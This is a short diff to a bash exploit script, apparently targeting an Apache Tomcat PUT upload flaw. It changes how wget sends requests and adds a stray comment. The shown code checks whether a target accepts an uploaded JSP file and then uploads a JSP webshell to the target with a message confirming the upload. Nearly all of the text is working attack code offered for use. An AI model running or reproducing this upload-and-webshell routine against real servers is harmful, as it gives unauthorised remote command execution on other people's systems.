@@ -7,6 +7,7 @@ YELLOW='\033[1;33m'
 NC='\033[0m'
 
 # Banner
+#teste
 banner="
    _______      ________    ___   ___  __ ______     __ ___   __ __ ______ 
   / ____\ \    / /  ____|  |__ \ / _ \/_ |____  |   /_ |__ \ / //_ |____  |
@@ -35,7 +36,7 @@ check_vuln() {
     echo -e "${GREEN}[+] Checking ${url}${NC}"
     
     # Create test payload
-    wget -q --post-data='<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>' --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" --method=PUT "${url}/${file}" -O /dev/null
+    wget -q --method=PUT --body-data='<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>' --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "${url}/${file}" -O /dev/null
     
     # Check response
     response=$(wget -q -O - --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "${url}/${file}")
@@ -72,7 +73,7 @@ create_webshell() {
 <pre><%=output %></pre>"
     
     echo -e "${GREEN}[+] Uploading webshell...${NC}"
-    wget -q --post-data="$evil" --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" --method=PUT "${url}/${file}" -O /dev/null
+    wget -q --method=PUT --body-data="$evil" --header="User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36" "${url}/${file}" -O /dev/null
     echo -e "${GREEN}[+] Webshell uploaded!${NC}"
 }
 
